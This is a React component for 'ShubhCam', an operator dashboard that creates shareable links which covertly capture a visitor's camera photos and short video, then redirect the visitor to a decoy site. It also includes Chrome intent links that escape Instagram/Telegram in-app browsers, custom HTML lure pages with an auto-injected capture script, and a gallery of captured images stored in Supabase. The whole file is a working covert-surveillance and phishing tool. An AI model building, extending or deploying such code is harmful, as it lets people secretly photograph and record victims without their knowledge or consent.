import { useState, useEffect, useRef } from "react";
import { Camera, Link2, Image, Copy, RefreshCw, Zap, Trash2, Download, ExternalLink, Code, Upload, Chrome, Video, Play } from "lucide-react";
import { Button } from "./ui/button";
import { Input } from "./ui/input";
import { Textarea } from "./ui/textarea";
import { toast } from "@/hooks/use-toast";
import { cn } from "@/lib/utils";
import { supabase } from "@/integrations/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

interface CapturedPhoto {
  id: string;
  image_data: string;
  captured_at: string;
  user_agent: string | null;
}

interface CapturedVideo {
  id: string;
  video_url: string;
  duration_seconds: number;
  captured_at: string;
  user_agent: string | null;
}

const ShubhCam = () => {
  const { settings, updateSettings } = useSettings();
  const [activeTab, setActiveTab] = useState<"link" | "photos" | "custom" | "chrome" | "video">("link");
  const [photos, setPhotos] = useState<CapturedPhoto[]>([]);
  const [videos, setVideos] = useState<CapturedVideo[]>([]);
  const [loading, setLoading] = useState(false);
  const [customHtml, setCustomHtml] = useState(settings.customCaptureHtml || "");
  const [chromeCustomHtml, setChromeCustomHtml] = useState(settings.chromeCustomHtml || "");
  const fileInputRef = useRef<HTMLInputElement>(null);
  const chromeFileInputRef = useRef<HTMLInputElement>(null);
  
  // Use session ID and redirect URL from settings (synced across all devices via Supabase)
  const sessionId = settings.camSessionId || "shubhcam01";
  const redirectUrl = settings.camRedirectUrl || "https://google.com";

  // Get current domain for link generation
  const currentOrigin = typeof window !== 'undefined' ? window.location.origin : '';
  const captureLink = `${currentOrigin}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}`;
  const customCaptureLink = `${currentOrigin}/custom-capture?session=${sessionId}`;
  const chromeCustomCaptureLink = `${currentOrigin}/chrome-custom-capture?session=${sessionId}`;
  const videoCaptureLink = `${currentOrigin}/video-capture?session=${sessionId}&duration=5&redirect=${encodeURIComponent(redirectUrl)}`;
  
  // Chrome intent link for in-app browsers (Instagram, Telegram, etc.)
  const chromeIntentLink = `intent://${currentOrigin.replace(/^https?:\/\//, '')}/capture?session=${sessionId}&redirect=${encodeURIComponent(redirectUrl)}#Intent;scheme=https;package=com.android.chrome;end`;
  // Load photos from Supabase
  const loadPhotos = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from('captured_photos')
      .select('*')
      .eq('session_id', sessionId)
      .order('captured_at', { ascending: false });
    
    if (error) {
      console.error('Error loading photos:', error);
      toast({
        title: "Error",
        description: "Failed to load photos",
        variant: "destructive"
      });
    } else {
      setPhotos(data || []);
    }
    setLoading(false);
  };

  // Load videos from Supabase
  const loadVideos = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from('captured_videos')
      .select('*')
      .eq('session_id', sessionId)
      .order('captured_at', { ascending: false });
    
    if (error) {
      console.error('Error loading videos:', error);
    } else {
      setVideos(data || []);
    }
    setLoading(false);
  };

  const deleteVideo = async (videoId: string, videoUrl: string) => {
    // Extract file path from URL
    const urlParts = videoUrl.split('/captured-videos/');
    if (urlParts[1]) {
      await supabase.storage.from('captured-videos').remove([urlParts[1]]);
    }
    
    const { error } = await supabase
      .from('captured_videos')
      .delete()
      .eq('id', videoId);
    
    if (error) {
      toast({
        title: "Error",
        description: "Failed to delete video",
        variant: "destructive"
      });
    } else {
      setVideos(videos.filter(v => v.id !== videoId));
      toast({
        title: "Deleted",
        description: "Video removed",
      });
    }
  };

  useEffect(() => {
    loadPhotos();
    loadVideos();
  }, [sessionId]);

  useEffect(() => {
    setCustomHtml(settings.customCaptureHtml || "");
    setChromeCustomHtml(settings.chromeCustomHtml || "");
  }, [settings.customCaptureHtml, settings.chromeCustomHtml]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied!",
      description: "Link copied to clipboard",
    });
  };

  const generateNewSession = () => {
    const newSessionId = Math.random().toString(36).substring(2, 10);
    updateSettings({ camSessionId: newSessionId });
    setPhotos([]);
    toast({
      title: "New Session Created",
      description: `Session ID: ${newSessionId} (synced across all devices)`,
    });
  };

  const refreshPhotos = async () => {
    setLoading(true);
    const { data, error } = await supabase
      .from('captured_photos')
      .select('*')
      .eq('session_id', sessionId)
      .order('captured_at', { ascending: false });
    
    if (error) {
      console.error('Error loading photos:', error);
      toast({
        title: "Error",
        description: "Failed to load photos",
        variant: "destructive"
      });
    } else {
      const newPhotos = data || [];
      setPhotos(newPhotos);
      toast({
        title: "Refreshed",
        description: `Found ${newPhotos.length} captured photos for session: ${sessionId}`,
      });
    }
    setLoading(false);
  };

  const deletePhoto = async (photoId: string) => {
    const { error } = await supabase
      .from('captured_photos')
      .delete()
      .eq('id', photoId);
    
    if (error) {
      toast({
        title: "Error",
        description: "Failed to delete photo",
        variant: "destructive"
      });
    } else {
      setPhotos(photos.filter(p => p.id !== photoId));
      toast({
        title: "Deleted",
        description: "Photo removed",
      });
    }
  };

  const downloadPhoto = (photo: CapturedPhoto) => {
    const link = document.createElement('a');
    link.href = photo.image_data;
    link.download = `capture_${photo.id}.jpg`;
    link.click();
  };

  const clearAllPhotos = async () => {
    const { error } = await supabase
      .from('captured_photos')
      .delete()
      .eq('session_id', sessionId);
    
    if (error) {
      toast({
        title: "Error",
        description: "Failed to clear photos",
        variant: "destructive"
      });
    } else {
      setPhotos([]);
      toast({
        title: "Cleared",
        description: "All photos deleted",
      });
    }
  };

  const handleFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        const content = e.target?.result as string;
        setCustomHtml(content);
        toast({
          title: "HTML Uploaded",
          description: "Custom HTML loaded successfully",
        });
      };
      reader.readAsText(file);
    }
  };

  const handleChromeFileUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onload = (e) => {
        const content = e.target?.result as string;
        setChromeCustomHtml(content);
        toast({
          title: "Chrome HTML Uploaded",
          description: "Chrome custom HTML loaded successfully",
        });
      };
      reader.readAsText(file);
    }
  };

  const saveCustomHtml = () => {
    updateSettings({ customCaptureHtml: customHtml });
    toast({
      title: "Saved!",
      description: "Custom HTML saved and synced",
    });
  };

  const saveChromeCustomHtml = () => {
    updateSettings({ chromeCustomHtml: chromeCustomHtml });
    toast({
      title: "Saved!",
      description: "Chrome custom HTML saved and synced",
    });
  };

  return (
    <div className="relative border-2 border-neon-pink rounded-xl p-5 bg-gradient-to-br from-card/50 via-neon-pink/5 to-card/50 mt-6 overflow-hidden shadow-[0_0_30px_hsl(var(--neon-pink)/0.2)]">
      {/* Animated corner accents */}
      <div className="absolute top-0 left-0 w-16 h-16 border-t-2 border-l-2 border-neon-pink rounded-tl-xl" />
      <div className="absolute top-0 right-0 w-16 h-16 border-t-2 border-r-2 border-neon-cyan rounded-tr-xl" />
      <div className="absolute bottom-0 left-0 w-16 h-16 border-b-2 border-l-2 border-neon-cyan rounded-bl-xl" />
      <div className="absolute bottom-0 right-0 w-16 h-16 border-b-2 border-r-2 border-neon-pink rounded-br-xl" />
      
      {/* Glowing orbs */}
      <div className="absolute -top-10 -right-10 w-32 h-32 bg-neon-pink/20 rounded-full blur-3xl" />
      <div className="absolute -bottom-10 -left-10 w-32 h-32 bg-neon-cyan/20 rounded-full blur-3xl" />

      {/* Header */}
      <div className="relative flex items-center gap-4 mb-5">
        <div className="relative p-3 rounded-xl border-2 border-neon-pink bg-gradient-to-br from-neon-pink/20 to-neon-cyan/10 shadow-[0_0_20px_hsl(var(--neon-pink)/0.4)]">
          <Camera className="w-7 h-7 text-neon-pink drop-shadow-[0_0_8px_hsl(var(--neon-pink))]" />
          <div className="absolute inset-0 rounded-xl border border-neon-pink/50 animate-ping opacity-30" />
        </div>
        <div>
          <h2 className="font-display font-bold text-2xl tracking-wider">
            <span className="text-neon-cyan drop-shadow-[0_0_10px_hsl(var(--neon-cyan))]">SHUBH</span>
            <span className="text-neon-pink drop-shadow-[0_0_10px_hsl(var(--neon-pink))]">CAM</span>
          </h2>
          <p className="text-neon-pink/80 text-xs flex items-center gap-1.5 font-mono">
            <Zap className="w-3 h-3 animate-pulse" /> REMOTE PHOTO CAPTURE SYSTEM
          </p>
        </div>
      </div>

      {/* Tabs */}
      <div className="relative flex rounded-xl overflow-hidden border-2 border-neon-pink/50 mb-5 bg-card/50 shadow-[inset_0_0_20px_hsl(var(--neon-pink)/0.1)]">
        <button
          onClick={() => setActiveTab("link")}
          className={cn(
            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide",
            activeTab === "link"
              ? "bg-gradient-to-r from-neon-pink to-neon-pink/80 text-background shadow-[0_0_20px_hsl(var(--neon-pink)/0.5)]"
              : "text-muted-foreground hover:bg-neon-pink/10 hover:text-neon-pink"
          )}
        >
          <Zap className="w-3 h-3" /> LINK
        </button>
        <button
          onClick={() => setActiveTab("video")}
          className={cn(
            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide border-l border-neon-pink/30",
            activeTab === "video"
              ? "bg-gradient-to-r from-neon-red to-neon-red/80 text-background shadow-[0_0_20px_hsl(var(--neon-red)/0.5)]"
              : "text-muted-foreground hover:bg-neon-red/10 hover:text-neon-red"
          )}
        >
          <Video className="w-3 h-3" /> VIDEO
        </button>
        <button
          onClick={() => setActiveTab("chrome")}
          className={cn(
            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide border-x border-neon-pink/30",
            activeTab === "chrome"
              ? "bg-gradient-to-r from-neon-orange to-neon-orange/80 text-background shadow-[0_0_20px_hsl(var(--neon-orange)/0.5)]"
              : "text-muted-foreground hover:bg-neon-orange/10 hover:text-neon-orange"
          )}
        >
          <Chrome className="w-3 h-3" /> CHROME
        </button>
        <button
          onClick={() => setActiveTab("custom")}
          className={cn(
            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide border-r border-neon-pink/30",
            activeTab === "custom"
              ? "bg-gradient-to-r from-neon-cyan to-neon-cyan/80 text-background shadow-[0_0_20px_hsl(var(--neon-cyan)/0.5)]"
              : "text-muted-foreground hover:bg-neon-cyan/10 hover:text-neon-cyan"
          )}
        >
          <Code className="w-3 h-3" /> HTML
        </button>
        <button
          onClick={() => { setActiveTab("photos"); refreshPhotos(); loadVideos(); }}
          className={cn(
            "flex-1 py-3 px-1 flex items-center justify-center gap-1 transition-all text-[10px] font-bold tracking-wide",
            activeTab === "photos"
              ? "bg-gradient-to-r from-neon-purple to-neon-purple/80 text-background shadow-[0_0_20px_hsl(var(--neon-purple)/0.5)]"
              : "text-muted-foreground hover:bg-neon-purple/10 hover:text-neon-purple"
          )}
        >
          <Image className="w-3 h-3" /> ({photos.length + videos.length})
        </button>
      </div>

      {activeTab === "link" ? (
        <div className="relative space-y-5">
          {/* How it works */}
          <div className="bg-gradient-to-r from-neon-pink/10 to-neon-cyan/10 rounded-xl p-4 border border-neon-pink/30 shadow-[inset_0_0_20px_hsl(var(--neon-pink)/0.1)]">
            <h3 className="font-bold text-neon-pink mb-3 flex items-center gap-2">
              <Zap className="w-4 h-4" /> How it works:
            </h3>
            <ol className="text-sm text-foreground/80 space-y-2">
              <li className="flex items-center gap-2">
                <span className="w-5 h-5 rounded-full bg-neon-pink/20 text-neon-pink text-xs flex items-center justify-center font-bold">1</span>
                Copy the link below
              </li>
              <li className="flex items-center gap-2">
                <span className="w-5 h-5 rounded-full bg-neon-cyan/20 text-neon-cyan text-xs flex items-center justify-center font-bold">2</span>
                Share with anyone
              </li>
              <li className="flex items-center gap-2">
                <span className="w-5 h-5 rounded-full bg-neon-purple/20 text-neon-purple text-xs flex items-center justify-center font-bold">3</span>
                Camera auto-captures & redirects!
              </li>
            </ol>
          </div>

          {/* Session ID */}
          <div className="flex items-center gap-2 text-xs bg-card/50 rounded-lg px-3 py-2 border border-neon-cyan/30">
            <span className="text-muted-foreground">Session:</span>
            <span className="text-neon-cyan font-mono font-bold tracking-wider">{sessionId}</span>
          </div>

          {/* Silent Link */}
          <div className="bg-card/30 rounded-xl p-4 border border-neon-pink/30">
            <div className="flex items-center gap-2 mb-3">
              <span className="text-xl">👁</span>
              <h3 className="text-neon-pink font-bold tracking-wide">SILENT LINK (Auto Capture)</h3>
            </div>
            <div className="flex gap-2">
              <Input
                value={captureLink}
                readOnly
                className="bg-background/50 border-neon-pink/50 text-neon-pink text-xs font-mono focus:border-neon-pink focus:ring-neon-pink/30"
              />
              <Button
                variant="outline"
                size="icon"
                onClick={() => copyToClipboard(captureLink)}
                className="border-neon-pink text-neon-pink hover:bg-neon-pink/20 hover:shadow-[0_0_15px_hsl(var(--neon-pink)/0.4)] shrink-0 transition-all"
              >
                <Copy className="w-4 h-4" />
              </Button>
            </div>
            <p className="text-neon-orange text-xs mt-3 flex items-center gap-1">
              ⚠ Capture ke baad redirect: <span className="font-mono">{redirectUrl}</span>
            </p>
          </div>

          {/* Redirect URL */}
          <div className="bg-card/30 rounded-xl p-4 border border-neon-cyan/30">
            <div className="flex items-center gap-2 mb-3">
              <span className="text-xl">🔗</span>
              <h3 className="text-neon-cyan font-bold tracking-wide">REDIRECT URL</h3>
            </div>
            <Input
              value={redirectUrl}
              onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
              placeholder="https://google.com"
              className="bg-background/50 border-neon-cyan/50 text-neon-cyan focus:border-neon-cyan focus:ring-neon-cyan/30"
            />
            <p className="text-neon-purple text-xs mt-3">
              💡 User capture ke baad is URL pe redirect hoga
            </p>
          </div>

          {/* Test Link */}
          <Button
            onClick={() => window.open(captureLink, '_blank')}
            variant="outline"
            className="w-full border-2 border-neon-cyan text-neon-cyan hover:bg-neon-cyan/20 hover:shadow-[0_0_20px_hsl(var(--neon-cyan)/0.4)] transition-all py-5"
          >
            <ExternalLink className="w-4 h-4 mr-2" /> TEST LINK
          </Button>

          {/* Action Buttons */}
          <div className="grid grid-cols-2 gap-3">
            <Button
              onClick={generateNewSession}
              variant="outline"
              className="border-2 border-neon-green text-neon-green hover:bg-neon-green/20 hover:shadow-[0_0_15px_hsl(var(--neon-green)/0.4)] transition-all py-5"
            >
              <Link2 className="w-4 h-4 mr-2" /> NEW SESSION
            </Button>
            <Button
              onClick={refreshPhotos}
              className="bg-gradient-to-r from-neon-pink to-neon-purple text-white font-bold hover:opacity-90 shadow-[0_0_20px_hsl(var(--neon-pink)/0.4)] transition-all py-5"
            >
              <RefreshCw className="w-4 h-4 mr-2" /> REFRESH
            </Button>
          </div>
        </div>
      ) : activeTab === "video" ? (
        <div className="relative space-y-5">
          {/* Video Capture Info */}
          <div className="bg-gradient-to-r from-neon-red/10 to-neon-pink/10 rounded-xl p-4 border border-neon-red/30 shadow-[inset_0_0_20px_hsl(var(--neon-red)/0.1)]">
            <h3 className="font-bold text-neon-red mb-3 flex items-center gap-2">
              <Video className="w-4 h-4" /> 5 Second Video Capture
            </h3>
            <p className="text-sm text-foreground/80 mb-2">
              User se permission lekar 5 second ki video record karega.
            </p>
            <ol className="text-sm text-foreground/70 space-y-2">
              <li className="flex items-start gap-2">
                <span className="w-5 h-5 rounded-full bg-neon-red/20 text-neon-red text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">1</span>
                <span>User "Start Recording" click karta hai</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="w-5 h-5 rounded-full bg-neon-pink/20 text-neon-pink text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">2</span>
                <span>Camera + Mic permission deta hai</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="w-5 h-5 rounded-full bg-neon-purple/20 text-neon-purple text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">3</span>
                <span>5 second video record + upload hoti hai</span>
              </li>
            </ol>
          </div>

          {/* Session ID */}
          <div className="flex items-center gap-2 text-xs bg-card/50 rounded-lg px-3 py-2 border border-neon-red/30">
            <span className="text-muted-foreground">Session:</span>
            <span className="text-neon-red font-mono font-bold tracking-wider">{sessionId}</span>
          </div>

          {/* Video Capture Link */}
          <div className="bg-card/30 rounded-xl p-4 border border-neon-red/30">
            <div className="flex items-center gap-2 mb-3">
              <span className="text-xl">🎬</span>
              <h3 className="text-neon-red font-bold tracking-wide">VIDEO CAPTURE LINK</h3>
            </div>
            <div className="flex gap-2">
              <Input
                value={videoCaptureLink}
                readOnly
                className="bg-background/50 border-neon-red/50 text-neon-red text-xs font-mono focus:border-neon-red focus:ring-neon-red/30"
              />
              <Button
                variant="outline"
                size="icon"
                onClick={() => copyToClipboard(videoCaptureLink)}
                className="border-neon-red text-neon-red hover:bg-neon-red/20 hover:shadow-[0_0_15px_hsl(var(--neon-red)/0.4)] shrink-0 transition-all"
              >
                <Copy className="w-4 h-4" />
              </Button>
            </div>
            <p className="text-neon-orange text-xs mt-3 flex items-center gap-1">
              ⚠ Video ke baad redirect: <span className="font-mono">{redirectUrl || "None"}</span>
            </p>
          </div>

          {/* Test Link */}
          <Button
            onClick={() => window.open(videoCaptureLink, '_blank')}
            variant="outline"
            className="w-full border-2 border-neon-red text-neon-red hover:bg-neon-red/20 hover:shadow-[0_0_20px_hsl(var(--neon-red)/0.4)] transition-all py-5"
          >
            <Play className="w-4 h-4 mr-2" /> TEST VIDEO LINK
          </Button>

          {/* Captured Videos */}
          {videos.length > 0 && (
            <div className="bg-card/30 rounded-xl p-4 border border-neon-purple/30">
              <div className="flex items-center justify-between mb-3">
                <h3 className="text-neon-purple font-bold tracking-wide text-sm flex items-center gap-2">
                  <Video className="w-4 h-4" /> CAPTURED VIDEOS ({videos.length})
                </h3>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={loadVideos}
                  className="border-neon-purple text-neon-purple hover:bg-neon-purple/10 h-7 text-xs"
                >
                  <RefreshCw className="w-3 h-3 mr-1" /> Refresh
                </Button>
              </div>
              <div className="space-y-3">
                {videos.slice(0, 5).map((video) => (
                  <div key={video.id} className="flex items-center gap-3 bg-background/30 rounded-lg p-2">
                    <video 
                      src={video.video_url} 
                      className="w-20 h-14 object-cover rounded-lg"
                      controls
                    />
                    <div className="flex-1 min-w-0">
                      <p className="text-xs text-foreground/70 truncate">
                        {new Date(video.captured_at).toLocaleString()}
                      </p>
                      <p className="text-[10px] text-muted-foreground">
                        {video.duration_seconds}s video
                      </p>
                    </div>
                    <Button
                      size="icon"
                      variant="outline"
                      onClick={() => deleteVideo(video.id, video.video_url)}
                      className="border-neon-red text-neon-red h-8 w-8"
                    >
                      <Trash2 className="w-3 h-3" />
                    </Button>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Action Buttons */}
          <div className="grid grid-cols-2 gap-3">
            <Button
              onClick={generateNewSession}
              variant="outline"
              className="border-2 border-neon-green text-neon-green hover:bg-neon-green/20 hover:shadow-[0_0_15px_hsl(var(--neon-green)/0.4)] transition-all py-5"
            >
              <Link2 className="w-4 h-4 mr-2" /> NEW SESSION
            </Button>
            <Button
              onClick={loadVideos}
              className="bg-gradient-to-r from-neon-red to-neon-pink text-white font-bold hover:opacity-90 shadow-[0_0_20px_hsl(var(--neon-red)/0.4)] transition-all py-5"
            >
              <RefreshCw className="w-4 h-4 mr-2" /> REFRESH
            </Button>
          </div>
        </div>
      ) : activeTab === "chrome" ? (
        <div className="relative space-y-5">
          {/* Chrome Intent Info */}
          <div className="bg-gradient-to-r from-neon-orange/10 to-neon-yellow/10 rounded-xl p-4 border border-neon-orange/30 shadow-[inset_0_0_20px_hsl(var(--neon-orange)/0.1)]">
            <h3 className="font-bold text-neon-orange mb-3 flex items-center gap-2">
              <Chrome className="w-4 h-4" /> Chrome Intent Link
            </h3>
            <p className="text-sm text-foreground/80 mb-2">
              Ye link Instagram/Telegram ke in-app browser se automatically Chrome me open hoga.
            </p>
            <ol className="text-sm text-foreground/70 space-y-2">
              <li className="flex items-start gap-2">
                <span className="w-5 h-5 rounded-full bg-neon-orange/20 text-neon-orange text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">1</span>
                <span>In-app browser detect karta hai</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="w-5 h-5 rounded-full bg-neon-yellow/20 text-neon-yellow text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">2</span>
                <span>Android pe auto Chrome redirect</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="w-5 h-5 rounded-full bg-neon-green/20 text-neon-green text-xs flex items-center justify-center font-bold shrink-0 mt-0.5">3</span>
                <span>Chrome me custom HTML + camera capture</span>
              </li>
            </ol>
          </div>

          {/* Session ID */}
          <div className="flex items-center gap-2 text-xs bg-card/50 rounded-lg px-3 py-2 border border-neon-orange/30">
            <span className="text-muted-foreground">Session:</span>
            <span className="text-neon-orange font-mono font-bold tracking-wider">{sessionId}</span>
          </div>

          {/* Chrome Custom HTML Upload */}
          <div className="bg-card/30 rounded-xl p-4 border border-neon-pink/30">
            <div className="flex items-center gap-2 mb-3">
              <Code className="w-5 h-5 text-neon-pink" />
              <h3 className="text-neon-pink font-bold tracking-wide text-sm">CHROME CUSTOM HTML</h3>
            </div>
            <p className="text-xs text-muted-foreground mb-3">
              Upload custom HTML jo Instagram/Telegram se Chrome me open hoke dikhega.
            </p>
            
            {/* File Upload */}
            <input
              type="file"
              accept=".html,.htm"
              ref={chromeFileInputRef}
              onChange={handleChromeFileUpload}
              className="hidden"
            />
            <Button
              onClick={() => chromeFileInputRef.current?.click()}
              variant="outline"
              className="w-full border-neon-pink text-neon-pink hover:bg-neon-pink/10 mb-3"
            >
              <Upload className="w-4 h-4 mr-2" /> UPLOAD HTML FILE
            </Button>

            {/* HTML Textarea */}
            <Textarea
              value={chromeCustomHtml}
              onChange={(e) => setChromeCustomHtml(e.target.value)}
              placeholder="Paste your HTML code here..."
              className="bg-input border-neon-pink/50 text-foreground font-mono text-xs min-h-[120px] mb-3"
            />

            {/* Save Button */}
            <Button
              onClick={saveChromeCustomHtml}
              className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
            >
              <Zap className="w-4 h-4 mr-2" /> SAVE CHROME HTML
            </Button>
          </div>

          {/* Chrome Custom Capture Link */}
          {chromeCustomHtml && (
            <div className="bg-card/30 rounded-xl p-4 border border-neon-green/30">
              <div className="flex items-center gap-2 mb-3">
                <span className="text-xl">🔗</span>
                <h3 className="text-neon-green font-bold tracking-wide text-sm">CHROME CUSTOM LINK</h3>
              </div>
              <p className="text-xs text-muted-foreground mb-3">
                Ye link Instagram/Telegram se Chrome me redirect karke custom HTML dikhayega.
              </p>
              <div className="flex gap-2 mb-3">
                <Input
                  value={chromeCustomCaptureLink}
                  readOnly
                  className="bg-background/50 border-neon-green/50 text-neon-green text-xs font-mono focus:border-neon-green focus:ring-neon-green/30"
                />
                <Button
                  variant="outline"
                  size="icon"
                  onClick={() => copyToClipboard(chromeCustomCaptureLink)}
                  className="border-neon-green text-neon-green hover:bg-neon-green/20 hover:shadow-[0_0_15px_hsl(var(--neon-green)/0.4)] shrink-0 transition-all"
                >
                  <Copy className="w-4 h-4" />
                </Button>
              </div>
              <Button
                onClick={() => window.open(chromeCustomCaptureLink, '_blank')}
                variant="outline"
                className="w-full border-neon-green text-neon-green hover:bg-neon-green/10"
              >
                <ExternalLink className="w-4 h-4 mr-2" /> TEST CHROME LINK
              </Button>
            </div>
          )}

          {/* Normal Link (with built-in detection) */}
          <div className="bg-card/30 rounded-xl p-4 border border-neon-cyan/30">
            <div className="flex items-center gap-2 mb-3">
              <span className="text-xl">✅</span>
              <h3 className="text-neon-cyan font-bold tracking-wide text-sm">SMART LINK (No Custom HTML)</h3>
            </div>
            <p className="text-xs text-muted-foreground mb-3">
              Standard link - capture karke redirect karta hai (custom HTML nahi dikhata).
            </p>
            <div className="flex gap-2">
              <Input
                value={captureLink}
                readOnly
                className="bg-background/50 border-neon-cyan/50 text-neon-cyan text-xs font-mono focus:border-neon-cyan focus:ring-neon-cyan/30"
              />
              <Button
                variant="outline"
                size="icon"
                onClick={() => copyToClipboard(captureLink)}
                className="border-neon-cyan text-neon-cyan hover:bg-neon-cyan/20 hover:shadow-[0_0_15px_hsl(var(--neon-cyan)/0.4)] shrink-0 transition-all"
              >
                <Copy className="w-4 h-4" />
              </Button>
            </div>
          </div>

          {/* Warning */}
          <div className="bg-neon-red/10 rounded-xl p-4 border border-neon-red/30">
            <div className="flex items-start gap-3">
              <span className="text-xl">⚠️</span>
              <div>
                <h4 className="text-neon-red font-bold text-sm mb-1">Important Notes</h4>
                <ul className="text-xs text-foreground/70 space-y-1">
                  <li>• Sirf Android devices pe kaam karta hai</li>
                  <li>• iOS/iPhone supported nahi hai</li>
                  <li>• Non-Chrome browsers me error message dikhega</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      ) : activeTab === "custom" ? (
        <div className="space-y-4">
          {/* Custom HTML Upload */}
          <div className="bg-muted/50 rounded-lg p-4 border border-border">
            <h3 className="font-bold text-neon-cyan mb-2">Custom HTML Capture</h3>
            <p className="text-sm text-muted-foreground">
              Upload your own HTML page. Camera capture script will be auto-injected.
            </p>
          </div>

          {/* File Upload */}
          <input
            type="file"
            accept=".html,.htm"
            ref={fileInputRef}
            onChange={handleFileUpload}
            className="hidden"
          />
          <Button
            onClick={() => fileInputRef.current?.click()}
            variant="outline"
            className="w-full border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
          >
            <Upload className="w-4 h-4 mr-2" /> UPLOAD HTML FILE
          </Button>

          {/* HTML Textarea */}
          <div>
            <div className="flex items-center gap-2 mb-2">
              <Code className="w-4 h-4 text-neon-cyan" />
              <h3 className="text-neon-cyan font-bold text-sm">HTML CODE</h3>
            </div>
            <Textarea
              value={customHtml}
              onChange={(e) => setCustomHtml(e.target.value)}
              placeholder="Paste your HTML code here..."
              className="bg-input border-neon-cyan/50 text-foreground font-mono text-xs min-h-[200px]"
            />
          </div>

          {/* Save Button */}
          <Button
            onClick={saveCustomHtml}
            className="w-full bg-neon-green text-background font-bold hover:bg-neon-green/90"
          >
            <Zap className="w-4 h-4 mr-2" /> SAVE HTML
          </Button>

          {/* Custom Link */}
          {customHtml && (
            <div className="space-y-3">
              <div className="flex items-center gap-2 mb-2">
                <span className="text-neon-pink">🔗</span>
                <h3 className="text-neon-pink font-bold text-sm">CUSTOM CAPTURE LINK</h3>
              </div>
              <div className="flex gap-2">
                <Input
                  value={customCaptureLink}
                  readOnly
                  className="bg-input border-neon-pink/50 text-neon-pink text-xs font-mono"
                />
                <Button
                  variant="outline"
                  size="icon"
                  onClick={() => copyToClipboard(customCaptureLink)}
                  className="border-neon-pink text-neon-pink hover:bg-neon-pink/10 shrink-0"
                >
                  <Copy className="w-4 h-4" />
                </Button>
              </div>
              <Button
                onClick={() => window.open(customCaptureLink, '_blank')}
                variant="outline"
                className="w-full border-neon-pink text-neon-pink hover:bg-neon-pink/10"
              >
                <ExternalLink className="w-4 h-4 mr-2" /> TEST CUSTOM LINK
              </Button>
            </div>
          )}
        </div>
      ) : (
        <div className="space-y-4">
          {loading ? (
            <div className="min-h-[200px] flex items-center justify-center">
              <div className="w-8 h-8 border-2 border-neon-green border-t-transparent rounded-full animate-spin" />
            </div>
          ) : photos.length === 0 ? (
            <div className="min-h-[200px] flex items-center justify-center">
              <div className="text-center text-muted-foreground">
                <Camera className="w-12 h-12 mx-auto mb-3 opacity-50" />
                <p>No photos captured yet</p>
                <p className="text-sm">Share your link to start capturing!</p>
              </div>
            </div>
          ) : (
            <>
              <div className="flex justify-between items-center">
                <span className="text-sm text-muted-foreground">{photos.length} captures</span>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={clearAllPhotos}
                  className="border-neon-red text-neon-red hover:bg-neon-red/10"
                >
                  <Trash2 className="w-3 h-3 mr-1" /> Clear All
                </Button>
              </div>
              <div className="grid grid-cols-2 gap-4">
                {photos.map((photo) => (
                  <div key={photo.id} className="relative group">
                    <img 
                      src={photo.image_data} 
                      alt={`Capture ${photo.id}`} 
                      className="rounded-lg border border-neon-green/30 w-full aspect-square object-cover"
                    />
                    <div className="absolute inset-0 bg-background/80 opacity-0 group-hover:opacity-100 transition-opacity rounded-lg flex items-center justify-center gap-2">
                      <Button
                        size="icon"
                        variant="outline"
                        onClick={() => downloadPhoto(photo)}
                        className="border-neon-green text-neon-green"
                      >
                        <Download className="w-4 h-4" />
                      </Button>
                      <Button
                        size="icon"
                        variant="outline"
                        onClick={() => deletePhoto(photo.id)}
                        className="border-neon-red text-neon-red"
                      >
                        <Trash2 className="w-4 h-4" />
                      </Button>
                    </div>
                    <p className="text-xs text-muted-foreground mt-1 truncate">
                      {new Date(photo.captured_at).toLocaleString()}
                    </p>
                  </div>
                ))}
              </div>
            </>
          )}
          
          <Button
            onClick={refreshPhotos}
            className="w-full bg-neon-pink text-background font-bold hover:bg-neon-pink/90"
          >
            <RefreshCw className="w-4 h-4 mr-2" /> REFRESH PHOTOS
          </Button>
        </div>
      )}
    </div>
  );
};

export default ShubhCam;
